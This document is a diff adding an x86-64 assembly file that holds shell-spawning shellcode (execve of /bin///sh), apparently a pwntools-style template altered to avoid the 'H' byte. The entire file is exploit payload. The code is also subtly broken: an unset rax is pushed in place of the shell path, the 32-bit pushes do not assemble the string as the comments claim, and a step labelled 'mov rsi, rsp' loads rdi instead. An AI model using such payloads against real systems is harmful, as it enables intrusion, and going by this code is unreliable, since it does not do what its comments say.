@@ -1,0 +1,45 @@
+
+
+
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+
+    /* has 'H' */
+    /* mov rax, 0x732f2f2f6e69622f */
+    push 0x732f2f2f
+    push 0x6e69622f
+
+    push rax
+
+    /* has 'H' */
+    /* mov rdi, rsp */
+    push rsp
+    pop rdi
+
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+
+    /* has 'H' */
+    /* add rsi, rsp */
+    add esi, esp
+
+    push rsi /* 'sh\x00' */
+
+    /* has 'H' */
+    /* mov rsi, rsp */
+    push rsp
+    pop rdi
+
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+
